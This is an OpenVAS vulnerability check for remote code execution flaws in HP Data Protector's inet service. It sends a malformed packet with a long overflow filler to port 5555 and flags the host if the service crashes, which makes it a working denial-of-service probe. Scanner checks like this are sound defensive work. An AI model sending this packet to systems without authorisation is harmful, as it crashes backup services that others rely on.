###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hp_data_protector_mult_code_exec_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
#
# HP (OpenView Storage) Data Protector Multiple Remote Code Execution Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:data_protector";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902454");
  script_version("$Revision: 11421 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2011-1865", "CVE-2011-1514", "CVE-2011-1515", "CVE-2011-1866");
  script_bugtraq_id(48486);
  script_name("HP (OpenView Storage) Data Protector Multiple Remote Code Execution Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("General");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_ports("Services/hp_dataprotector", 5555);
  script_mandatory_keys("hp_data_protector/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17458/");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Jun/552");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Jun/551");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary   code and lead to denial of service conditions.");

  script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector 6.20 and prior.");

  script_tag(name:"insight", value:"Multiple flaws are due to error in 'data protector inet' service,
  command. which allows remote remote attackers to execute arbitrary code.");

  script_tag(name:"summary", value:"This host is installed with HP (OpenView Storage) Data Protector and is prone to
  multiple remote code execution vulnerabilities.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to the Detection NVT within the GSA

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

headdata = raw_string( 0x00, 0x00, 0x27, 0xca, 0xff, 0xfe, 0x32,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x32, 0x00, 0x38, 0x00, 0x00,
                 0x00, 0x20, 0x00 );

middata = crap( data:raw_string( 0x61 ), length:10001 );

lastdata = raw_string( 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00 );

req = headdata + middata + lastdata;

send( socket:soc, data:req );

close( soc );

sleep( 5 );

soc = open_sock_tcp( port );
if( ! soc ) {
  security_message( port:port );
  exit( 0 );
} else {
  response = recv( socket:soc, length:4096, timeout:20 );
  if( "HP Data Protector" >!< response && "HPE Data Protector" >!< response && "HP OpenView Storage Data Protector" >!< response ) {
    security_message( port:port );
    exit( 0 );
  }
}

close( soc );

exit( 99 );